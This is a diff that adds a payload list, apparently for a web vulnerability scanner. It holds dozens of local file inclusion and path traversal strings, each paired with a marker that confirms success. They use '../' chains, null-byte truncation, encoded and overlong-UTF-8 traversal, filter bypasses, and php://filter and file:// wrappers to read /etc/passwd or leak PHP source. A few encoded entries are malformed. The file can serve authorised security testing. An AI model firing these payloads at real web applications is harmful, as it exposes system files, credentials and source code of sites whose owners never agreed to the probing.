@@ -1,0 +1,63 @@
+LFI payload#1::/etc/passwd::root:
+LFI payload#2::../etc/passwd::root:
+LFI payload#3::/etc/passwd::root:
+LFI payload#4::../etc/passwd::root:
+LFI payload#5::../../etc/passwd::root:
+LFI payload#6::../../../etc/passwd::root:
+LFI payload#7::../../../../etc/passwd::root:
+LFI payload#8::../../../../../etc/passwd::root:
+LFI payload#9::../../../../../../etc/passwd::root:
+LFI payload#10::../../../../../../../etc/passwd::root:
+LFI payload#11::../../../../../../../../etc/passwd::root:
+LFI payload#12::index.php::<?php
+LFI payload#13::../index.php::<?php
+LFI payload#14::../../index.php::<?php
+LFI payload#15::../../../index.php::<?php
+LFI payload#16::../../../../index.php::<?php
+LFI payload#17::../../../../../index.php::<?php
+LFI payload#18::../../../../../../index.php::<?php
+LFI payload#19::../../../../../../../index.php::<?php
+LFI payload#20::../../../../../../../../index.php::<?php
+LFI payload#21::/etc/passwd%00::root:
+LFI payload#22::../etc/passwd%00::root:
+LFI payload#23::../../etc/passwd%00::root:
+LFI payload#24::../../../etc/passwd%00::root:
+LFI payload#25::../../../../etc/passwd%00::root:
+LFI payload#26::../../../../../etc/passwd%00::root:
+LFI payload#27::../../../../../../etc/passwd%00::root:
+LFI payload#28::../../../../../../../etc/passwd%00::root:
+LFI payload#29::../../../../../../../../etc/passwd%00::root:
+LFI '..%2f' encoded payload#1::..%2fetc%2fpasswd%00::root:
+LFI '..%2f' encoded payload#2::..2f..%2f..%2fetc%2fpasswd%00::root:
+LFI '..%2f' encoded payload#3::..2f..%2f..%2f..%2fetc%2fpasswd%00::root:
+LFI '..%2f' encoded payload#4::..2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
+LFI '..%2f' encoded payload#5::..2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
+LFI '..%2f' encoded payload#6::..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
+LFI '..%2f' encoded payload#7::..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
+LFI '..%2f' encoded payload#8::..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
+LFI payload with unexisting file::pwnsociety::not found
+LFI payload with '^^%00' escaping payload#1::/../etc/passwd^^%00::root:
+LFI payload with '^^%00' escaping payload#2::/../../etc/passwd^^%00::root:
+LFI payload with '^^%00' escaping payload#3::/../../../etc/passwd^^%00::root:
+LFI payload with '^^%00' escaping payload#4::/../../../../etc/passwd^^%00::root:
+LFI payload with '^^%00' escaping payload#5::/../../../../../etc/passwd^^%00::root:
+LFI payload with '^^%00' escaping payload#6::/../../../../../../../../../../etc/passwd^^%00::root:
+LFI '/%00/' encoded escape payload#1::/%00//etc/passwd%00::root:
+LFI '/%00/' encoded escape payload#2::/%00//%00/etc/passwd%00::root:
+LFI '/%00/' encoded escape payload#3::/%00//%00//%00/etc/passwd%00::root:
+LFI '/%00/' encoded escape payload#4::/%00//%00//%00//%00/etc/passwd%00::root:
+LFI '/%00/' encoded escape payload#5::/%00//%00//%00//%00//%00/etc/passwd%00::root:
+LFI filter payload#1::php://filter/convert.base64-encode/resource=index.php::PD9w
+LFI filter payload#2::php://filter/convert.base64-encode/resource=../index.php::PD9w
+LFI double escaping payload#1::....//etc/passwd::root:
+LFI double escaping payload#2::....//....//etc/passwd::root:
+LFI double escaping payload#3::....//....//....//etc/passwd::root:
+LFI double escaping payload#4::....//....//....//....//etc/passwd::root:
+LFI double escaping payload#5::....//....//....//....//....//etc/passwd::root:
+LFI wrapper payload#1::file:///etc/passwd::root:
+LFI wrapper payload#2::file://../etc/passwd::root:
+LFI '..%c0%af../' encoded payload#1::/..%c0%af../etc/passwd::root:
+LFI '..%c0%af../' encoded payload#2::/..%c0%af../..%c0%af../etc/passwd::root:
+LFI '..%c0%af../' encoded payload#3::/..%c0%af../..%c0%af../..%c0%af../etc/passwd::root:
+LFI '..%c0%af../' encoded payload#4::/..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd::root:
+LFI '..%c0%af../' encoded payload#5::/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd::root:
